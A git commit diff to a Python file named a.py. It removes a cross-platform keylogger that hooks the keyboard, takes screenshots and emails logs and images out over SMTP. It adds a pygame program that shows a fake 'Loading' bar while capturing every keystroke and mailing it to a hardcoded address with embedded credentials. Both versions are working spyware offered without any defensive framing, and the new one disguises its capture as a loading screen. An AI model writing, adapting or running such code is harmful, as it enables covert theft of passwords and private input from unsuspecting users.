442bd0d79078881247f59d28d85deb42ded03a05
Sanjok Karki <55534535+sanjokkarki@users.noreply.github.com>
2021-01-22 09:07:59 +0000

    Update a.py

--- a.py
+++ a.py
@@ -1,173 +1,55 @@
-import platform
-system = platform.system()
-if system == "Linux" or system == "linux":
-  import pyxhook
-  import datetime,os,sys,platform
-  import argparse as args
-  import smtplib
-  from time import *
-  import pyscreenshot as ImageGrab
-  from email.mime.multipart import MIMEMultipart
-  from email.mime.text import MIMEText
-  from email.mime.base import MIMEBase
-  from email.mime.image import MIMEImage
-  from email import encoders as Encoders
-  from email.utils import COMMASPACE, formatdate
+import pygame
+import sys
+import smtplib
 
-else:
-  import pythoncom,logging
-  import pyWinhook as pyHook
-  import datetime,os,sys,platform
-  import argparse as args
-  import smtplib
-  from time import *
-  import pyscreenshot as ImageGrab
-  from email.mime.multipart import MIMEMultipart
-  from email.mime.text import MIMEText
-  from email.mime.base import MIMEBase
-  from email.mime.image import MIMEImage  
-  from email import encoders as Encoders
-  from email.utils import COMMASPACE, formatdate  
+FROMADDR = "Blackhat_test@protonmail.ch"
+TOADDR = "TheSanjok@protonmail.ch"
+MSG = ''
 
-#arguments
-parser = args.ArgumentParser(description="The basic keylogger that use smtp use -e and -p to the program work perfect")
-parser.add_argument("-e", "--email",required=True,help="Your email to send the logs")
-parser.add_argument("-p", "--password",required=True,help="Your password to the program send the logs")
-parser.add_argument("-l", "--local",required=False,type=str,default="/tmp/logs.txt",help="the place where do you will put the logs")
-parser.add_argument("-t", "--time",required=False,type=int,default=60,help="is the time the Screenshots is will be sended to your email ")
+red = (255, 0, 0)
+x_val = 0
+keys = []
+key_string = ""
 
-parsed_args = parser.parse_args()
+pygame.init()
 
-#declaration of vars
+arial = pygame.font.SysFont("comicsansms", 48)
+text = arial.render("Loading", 1, red, None)
+screen = pygame.display.set_mode((800, 600))
 
-data_hora = datetime.datetime.now()
-data_hora = str(data_hora).split('.')[0].replace(' ','_')###
-sendTo = parsed_args.email #for where you'll send the archive
-assunto = 'Keylogger %s' %data_hora
-mensagem = ' the keylogger dumped it %s '%data_hora #mensage and take the hour on pc 
-youremail = parsed_args.email
-password = parsed_args.password
-server= 'smtp.gmail.com' #it is a server of google to receve the email more do you can change that to other
-port = 587
-sendtime = parsed_args.time
-log_file = parsed_args.local
+username = 'Blackhat_test@protonmail.ch'
+password = 'test@123'
 
+clock = pygame.time.Clock()
 
-def send_Image(image):
-  img_data = open(image, 'rb').read()
-  msg = MIMEMultipart()
-  From = youremail
-  To = youremail
+running = True
 
-  msg['Subject'] = 'Screenshots'
-  msg['From'] = From
-  msg['To'] = To
+while running:
+    for event in pygame.event.get():
+        if event.type == pygame.QUIT:
+            running = False
+        if event.type == pygame.KEYUP:
+            name = pygame.key.name(event.key)
+            if event.key == 13:
+                key_string += '\n'
+            elif event.key == 32:
+                key_string += ' '
+            else:
+                key_string += name
 
-  text = MIMEText('keylogger images')
-  msg.attach(text)
-  fp = open(image, 'rb')
-  msgImage = MIMEImage(fp.read())
-  fp.close()
-  msg.attach(msgImage)
+            MSG = key_string
+    clock.tick(60)
 
-  s = smtplib.SMTP(server, port)
-  s.ehlo()
-  s.starttls()
-  s.ehlo()
-  s.login(youremail, password)
-  s.sendmail(From, To, msg.as_string())
-  s.quit()
+    pygame.draw.rect(screen, red, (0, 550, x_val, 20))
+    x_val += 0.1
+    screen.blit(text, (325, 100))
+    #print(key_string)
+    pygame.display.flip()
 
-def screenshot():
-  while True:
-    im = ImageGrab.grab()
-
-    for i in range(100):
-      sleep(sendtime)
-      atual_image = i
-      im.save(str(i), 'jpeg')
-
-      if i == atual_image:
-        dic = os.getcwd() + "/" + str(i) 
-
-        send_Image(dic)
-        os.remove(dic)
-     
-#this function manager and create the heards among other things 
-def send_email(server, port, FROM, PASS, TO, subject, texto, anexo=[]):
-  global exit 
-  server = server
-  port = port
-  FROM = FROM
-  PASS = PASS
-  TO = TO
-  subject = subject
-  texto = texto
-  msg = MIMEMultipart()
-  msg['From'] = FROM
-  msg['To'] = TO
-  msg['Subject'] = subject
-  msg.attach(MIMEText(texto))
-
-  for f in anexo:
-    part = MIMEBase('application', 'octet-stream')
-    os.chdir(r"/")
-    part.set_payload(open(f, 'rb').read())
-    Encoders.encode_base64(part)
-    part.add_header('Content-Disposition','attachment;filename="%s"'% os.path.basename(f))
-    msg.attach(part)
-
-  try:
-    gm = smtplib.SMTP(server,port)
-    gm.ehlo()
-    gm.starttls()
-    gm.ehlo()
-    gm.login(FROM, PASS)
-    gm.sendmail(FROM, TO, msg.as_string())
-    gm.close()
-
-  except Exception as e:
-    errorMsg = "Nao Foi Possivel Enviar o Email.\n Error: %s" % str(e)
-    print('%s'%errorMsg)
-
-try:
-#Linux version if do you try run this code on linux
-  if system == "Linux" or  system == "linux":
-    def OnKeyPress(event): #essa função pega as teclas que foram precionadas
-      fob=open(log_file,'a')
-      fob.write(event.Key)
-      fob.write(f"this key did pressed {event.key} \n")
-      os.system("")
-
-      if event.Ascii==59: #59 this value is represented for ; if this key pressed it'll stop the keylogger and will send the email
-        fob.close()
-        new_hook.cancel()
-        send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
-        os.remove(log_file)
-
-    new_hook = pyxhook.HookManager()
-    new_hook.KeyDown= OnKeyPress
-    new_hook.Key = OnKeyPress
-    new_hook.HookKeyboard()
-    new_hook.start()
-    screenshot()
-#Windons Version if do you try run it on Windows that is obvious 
-  elif system == "Windows":
-    def OnKeyboardEvent(event):
-      fob=open(log_file,"a")
-      fob.write(event.Key)
-      fob.write(f"this key did pressed {event.key} \n")
- 
-      if event.Ascii==59:
-        fob.close
-        send_email(server, port, youremail, password, sendTo, assunto, mensagem,[log_file])
-        os.remove(log_file)
-        exit(1)
-
-    hooks_manager = pyHook.HookManager()
-    hooks_manager.KeyDown = OnKeyboardEvent
-    hooks_manager.HookKeyboard()
-    pythoncom.PumpMessages()  
-    screenshot()
-except(KeyboardInterrupt):
-  print("Sorry Not Day")
+# The actual mail send
+server = smtplib.SMTP('smtp.gmail.com:587')
+server.starttls()
+server.login(username,password)
+server.sendmail(FROMADDR, TOADDR, MSG)
+server.quit()
+sys.exit()
